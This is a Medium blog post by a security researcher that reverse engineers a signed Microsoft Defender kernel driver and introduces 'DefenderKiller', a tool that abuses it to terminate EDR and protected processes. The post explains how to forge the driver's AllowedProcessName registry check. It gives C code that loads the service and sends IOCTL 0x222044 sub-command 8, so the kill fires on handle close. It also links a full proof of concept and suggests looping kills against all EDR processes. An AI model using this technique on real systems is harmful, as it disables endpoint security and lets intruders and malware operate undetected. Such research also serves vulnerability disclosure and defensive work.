# https://medium.com/@jehadbudagga/born-to-defend-weaponized-to-kill-weaponizing-microsofts-own-driver-to-kill-edrs-af4b85c1a43c

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=---top_nav_layout_nav-------------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40jehadbudagga%2Fborn-to-defend-weaponized-to-kill-weaponizing-microsofts-own-driver-to-kill-edrs-af4b85c1a43c&source=post_page---top_nav_layout_nav-----------------------global_nav--------------------)

[Medium Logo](https://medium.com/?source=---top_nav_layout_nav-------------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav--------------------)

[Search](https://medium.com/search?source=---top_nav_layout_nav-------------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40jehadbudagga%2Fborn-to-defend-weaponized-to-kill-weaponizing-microsofts-own-driver-to-kill-edrs-af4b85c1a43c&source=post_page---top_nav_layout_nav-----------------------global_nav--------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

[Byovd](https://medium.com/tag/byovd?source=post_page---header_tags--af4b85c1a43c-----------------------------------------)

[Edr](https://medium.com/tag/edr?source=post_page---header_tags--af4b85c1a43c-----------------------------------------)

[Edr Evasion](https://medium.com/tag/edr-evasion?source=post_page---header_tags--af4b85c1a43c-----------------------------------------)

[Av Evasion](https://medium.com/tag/av-evasion?source=post_page---header_tags--af4b85c1a43c-----------------------------------------)

# Born to Defend, Weaponized to Kill: Weaponizing Microsoft’s Own Driver to Kill EDRs

[![Jehad Abudagga](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@jehadbudagga?source=post_page---byline--af4b85c1a43c-----------------------------------------)

[Jehad Abudagga](https://medium.com/@jehadbudagga?source=post_page---byline--af4b85c1a43c-----------------------------------------)

Follow

7 min read

·

Jun 29, 2026

58

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Daf4b85c1a43c&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40jehadbudagga%2Fborn-to-defend-weaponized-to-kill-weaponizing-microsofts-own-driver-to-kill-edrs-af4b85c1a43c&source=---header_actions--af4b85c1a43c---------------------post_audio_button--------------------)

Share

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*IT6E-W1nI9qno8buXtj5kw.png)

Hello again everyone…

So this one is a bit different from my usual driver research. Every BYOVD tool out there relies on third-party drivers, some random gaming driver, an OEM utility, or a hardware diagnostic tool that happens to be signed. You bring the driver, you load it, you exploit it. That’s the standard playbook.

But what if the killer was already installed? What if Microsoft themselves signed a kernel driver with a clean process kill primitive, shipped it with Defender, and just… left it there?

That’s exactly what I found.

I’ve had this driver sitting on my desktop for about six months. Pulled it during one of my BYOVD hunting sessions, threw it in the pile with dozens of other signed `.sys` files, and never looked at it again. Last week I finally loaded it into IDA, and within minutes I realized this wasn't just another vulnerable driver. This was Microsoft's own Defender kernel component.

One IOCTL. One sub-command. `ZwTerminateProcess` from ring 0. Any process, any PID, PPL or not. Gone.

In this article I’m going to reverse engineer the kill mechanism, break down how the driver authenticates callers and how we bypass it, and introduce **DefenderKiller**, a tool that uses Microsoft’s own signed driver against itself to terminate any EDR on the system.

Let’s get into it.

Looking at the driver on Virus Total, we can see it has a clean **0/70** detection rate. Not a single security vendor flags it.

Link : [https://www.virustotal.com/gui/file/d5764d24e78914ab2a9db6b24e323342d0b37998f43add1a9e49b00992b0d645](https://www.virustotal.com/gui/file/d5764d24e78914ab2a9db6b24e323342d0b37998f43add1a9e49b00992b0d645)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*AuRUhyq8UE0wjIKJC_HZiw.png)

**Figure 1:** VirusTotal scan showing 0/70 detection rate for KSLDriver.sys

The driver is identified as a **Microsoft Malware Protection** system driver, part of the Windows Defender kernel support infrastructure. It carries a valid digital signature issued by **Microsoft Code Signing PCA**, meaning Windows trusts it at the highest level. It passes driver signature enforcement on every version of Windows from 7 through 11, including systems with the April 2026 driver trust policy enabled.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*jf8dOh_a3fPKiNv0RvEFvg.png)

**Figure 2:** Valid Microsoft signature chain.

This is important: Microsoft maintains a **Vulnerable Driver Blocklist** (DriverSiPolicy.p7b) that prevents known-exploitable drivers from loading on systems with HVCI enabled. However, Microsoft’s own signed drivers are **excluded from this blocklist by design**. This driver will load on any Windows system, fully trusted, no blocks, no warnings.

Now let’s open it in IDA and see what’s inside.

## 1\. Reverse Engineering the Driver init

Before we get into the kill mechanism, let’s understand how this driver initializes and how it decides who is allowed to talk to it.

Starting from `DriverEntry`, the driver allocates a global context structure with pool tag `KSLD` :

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*8lUv1Ymhsqc5bTTmmmZA7g.png)

**Figure 3:** DriverEntry allocating global context structure with pool tag KSLB

And after that immediately reads three registry values from its service key using the function sub\_1A010 :

![](https://miro.medium.com/v2/resize:fit:588/1*8OARyb7ArycTg_4crDfPpg.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*kY-rRaYmXlBdIK_09d254A.png)

**Figure 4:** DriverEntry calling sub\_1A010 three times to read DeviceName, AllowedProcessName, and ImagePath from the service registry key

In the following screenshot we can see the strings of three registry values it checks for:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*eYTnv3Pnp6QCh63IGsq1Ng.png)

**Figure 5:** IDA strings view showing the three registry value names: DeviceName, AllowedProcessName, ImagePath, and the SDDL string D:P(A;;GA;;;SY)(A;;GA;;;BA)

These three values control the entire driver:

**DeviceName** : The name used to create the device object in the kernel namespace. Whatever string you put here becomes the device path `\Device\<name>` and the symlink `\DosDevices\<name>`. This means the device name is fully controlled through the registry, there is no hardcoded paths.

**AllowedProcessName** : This is the driver’s only access control mechanism. It stores the full NT image path of the one process that is allowed to open a handle to the device.

**ImagePath** : The path to the driver binary on disk. The driver stores this so it can delete itself on unload. Yes, the driver has a built-in self-destruct, but more on that later.

If any of these three registry reads fail, `DriverEntry` fails and the driver refuses to load.

After reading the registry values, the driver creates its device object using `IoCreateDeviceSecure` with SDDL `D:P(A;;GA;;;SY)(A;;GA;;;BA)`, restricting access to SYSTEM and Administrators only.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Ros9ExtQw9I5VpUZOsOuOg.png)

**Figure 6:** sub\_18254 resolving IoCreateDeviceSecure via MmGetSystemRoutineAddress.

The driver then assigns its IRP handlers. The important ones:

- `MajorFunction[0]` (CREATE) → `sub_115D0`
- `MajorFunction[14]` (DEVICE\_CONTROL) → `sub_11750`

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Ff_k09eh18Vq0ZcxZkCBkg.png)

When a process opens the device, `sub_115D0` grabs the caller's PID via `PsGetCurrentProcessId`, resolves the full NT image path using `ZwQueryInformationProcess(ProcessImageFileName)`, and compares it against the stored `AllowedProcessName` using `RtlCompareUnicodeString`.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*ufbxBCRzVNHGdurfVUU3_Q.png)

**Figure 7:** sub\_115D0 (IRP\_MJ\_CREATE handler) performing the AllowedProcessName check: PsGetCurrentProcessId → sub\_11440 → RtlCompareUnicodeString. Returns STATUS\_ACCESS\_DENIED (0xC0000022) on mismatch.

if Match → access granted, authentication flag set.

if No match → `STATUS_ACCESS_DENIED`.

The bypass is straightforward. Loading a kernel driver already requires admin. We simply write our own executable’s NT path to `AllowedProcessName` in the registry before starting the service. The driver reads it on load and trusts it blindly. No signature check, no certificate validation.

Now let’s look at what happens when we send the kill command.

## 2\. Reverse Engineering The Kill Mechanism

The driver handles a single IOCTL code `0x222044` through `sub_11750`. The first DWORD of the input buffer selects the sub-command.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*-nSHxMwRtWIW-OFUDL2sWg.png)

**Figure 8:** sub\_11750 IOCTL dispatch handler checking for IOCTL code 0x222044

Sub-command 8 is the kill. The driver takes the PID from the input buffer and calls `sub_120A0`, which does `ZwOpenProcess` followed by `ObReferenceObjectByHandle` to obtain a referenced EPROCESS pointer. This gets stored in the driver's global state.

## Get Jehad Abudagga’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

But the kill doesn’t happen here. It happens when you **close the handle**.

When the last handle to the device is closed, `IRP_MJ_CLEANUP` fires. The handler checks if a target EPROCESS is stored, and if so, calls `sub_113A0`:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*gPlilVGwAN5Xp3GOLff7Pg.png)

**Figure 9:** sub-command 8 calling sub\_120A0 to store target EPROCESS, with sub\_113A0 kill on PID swap

Four API calls. That’s the entire kill:

1. PsGetProcessId(EPROCESS) → get PID from stored EPROCESS
2. ZwOpenProcess(0x1F0FFF) → open with PROCESS\_ALL\_ACCESS
3. ZwTerminateProcess(handle, status) → kill
4. ZwClose(handle) → done

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*rqcv4qyJc4bXWTbbgdiQcw.png)

**Figure 10:** sub\_113A0, the kill function.

The kill flow from usermode:

1. `CreateFile` → opens device, passes AllowedProcessName check.
2. `DeviceIoControl(0x222044, subcmd=8, PID)` → stores target EPROCESS.
3. `CloseHandle` → CLEANUP fires → `ZwTerminateProcess` → target dead.

## 3\. Writing the POC

Now that we understand the full chain, let’s weaponize it. We know:

- The driver reads `DeviceName`, `AllowedProcessName`, and `ImagePath` from its service registry key
- The device is created with whatever name we put in `DeviceName`
- The only access control is a path comparison against `AllowedProcessName`, which we control through the registry
- The kill fires on handle close (IRP\_MJ\_CLEANUP), not on the IOCTL itself
- Sub-command 8 via IOCTL `0x222044` stores the target PID as an EPROCESS reference
- `ZwTerminateProcess` executes from kernel mode on `CloseHandle`

The tool needs three operations: **load**, **kill**, and **unload**.

### Loading the Driver

First, we create a kernel service pointing to the driver binary. Before starting it, we write three registry values: `DeviceName` for the device path, `ImagePath` for the driver location, and most importantly, `AllowedProcessName` set to our own executable's NT path.

To get our own NT path, we call `NtQueryInformationProcess` with `ProcessImageFileName` (class 27), the same API the driver uses internally to verify callers:

```
ULONG n = 0;
NtQueryInformationProcess(GetCurrentProcess(), 27, NULL, 0, &n);
BYTE* buf = calloc(n + 2, 1);
NtQueryInformationProcess(GetCurrentProcess(), 27, buf, n, NULL);
UNICODE_STRING* us = (UNICODE_STRING*)buf;
```

Then we write it to the registry and start the service:

```
RegSetValueExW(hk, L"DeviceName", 0, REG_SZ,
    (BYTE*)L"DefenderKiller", sizeof(L"DefenderKiller"));
RegSetValueExW(hk, L"AllowedProcessName", 0, REG_SZ,
    (BYTE*)ntPath, (wcslen(ntPath)+1)*2);
StartServiceA(svc, 0, NULL);
```

When the driver loads, it reads our values and creates the device at `\\.\DefenderKiller`. When we call `CreateFile` on it, the driver compares our process path against what we wrote. Match. Access granted.

### The Kill

With the device open, we send sub-command 8 with the target PID. The input buffer is simple, first DWORD is the sub-command, second DWORD is the PID:

```
BYTE cmd[8] = {0};
*(DWORD*)cmd = 8;             // sub-command 8: set target
*(DWORD*)(cmd+4) = pid;       // target PID
DeviceIoControl(h, 0x222044, cmd, 8, out, 8, &br, NULL);
```

Then we close the handle. That’s it. The CLEANUP handler fires in the kernel, calls `ZwTerminateProcess`, and the target process is gone:

```
CloseHandle(h);  // triggers IRP_MJ_CLEANUP → ZwTerminateProcess
```

Full POC : [https://github.com/redteamfortress/DefenderKiller](https://github.com/redteamfortress/DefenderKiller)

backup repo: [https://git.redteamfortress.com/j3h4ck/DefenderKiller](https://git.redteamfortress.com/j3h4ck/DefenderKiller)

Now lets test it against \*DELETED\*.

\*There was a test here but it was deleted to not get in trouble\*

**Note:** This is a simple POC that demonstrates the kill primitive. Some EDRs will respawn their processes through a watchdog service or a secondary kernel component. To handle that, you can weaponize this further by running the kill in a loop targeting all known EDR process names. That’s left as an exercise, the kill mechanism itself works against any process regardless of protection level.

## Final Thoughts

Microsoft built a kernel process killer, signed it with their own certificate, shipped it with Defender, and left it trusted for over a decade. It bypasses every protection they’ve built.

If you found this research interesting, follow me for more kernel exploitation and EDR bypass research.

**Disclaimer:** This research is for authorized security testing and educational purposes only. Use only on systems you own or have explicit written permission to test.

**X:** [@j3h4ck](https://x.com/j3h4ck)

**LinkedIn:** [Jehad Abudagga](https://www.linkedin.com/in/jehad-abudagga)

**GitHub:** [redteamfortress](https://github.com/redteamfortress)

**Medium:** [@jehadbudagga](https://medium.com/@jehadbudagga)

[Byovd](https://medium.com/tag/byovd?source=post_page---footer_tags--af4b85c1a43c-----------------------------------------)

[Edr](https://medium.com/tag/edr?source=post_page---footer_tags--af4b85c1a43c-----------------------------------------)

[Edr Evasion](https://medium.com/tag/edr-evasion?source=post_page---footer_tags--af4b85c1a43c-----------------------------------------)

[Av Evasion](https://medium.com/tag/av-evasion?source=post_page---footer_tags--af4b85c1a43c-----------------------------------------)

[![Jehad Abudagga](https://miro.medium.com/v2/resize:fill:48:48/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@jehadbudagga?source=post_page---post_author_info--af4b85c1a43c-----------------------------------------)

[![Jehad Abudagga](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@jehadbudagga?source=post_page---post_author_info--af4b85c1a43c-----------------------------------------)

Follow

[**Written by Jehad Abudagga**](https://medium.com/@jehadbudagga?source=post_page---post_author_info--af4b85c1a43c-----------------------------------------)

[182 followers](https://medium.com/@jehadbudagga/followers?source=post_page---post_author_info--af4b85c1a43c-----------------------------------------)

· [3 following](https://medium.com/@jehadbudagga/following?source=post_page---post_author_info--af4b85c1a43c-----------------------------------------)

Security Researcher \| CETP \| CPTS \| CRTL \| CRTO \| CRTE \| CRTP \| eCPPT \| C-ADPenX \| CRTeamerX

Follow

[Help](https://help.medium.com/hc/en-us?source=post_page-----af4b85c1a43c-----------------------------------------)

[Status](https://status.medium.com/?source=post_page-----af4b85c1a43c-----------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----af4b85c1a43c-----------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----af4b85c1a43c-----------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----af4b85c1a43c-----------------------------------------)

[Store](https://medium.com/store)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----af4b85c1a43c-----------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----af4b85c1a43c-----------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----af4b85c1a43c-----------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----af4b85c1a43c-----------------------------------------)

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**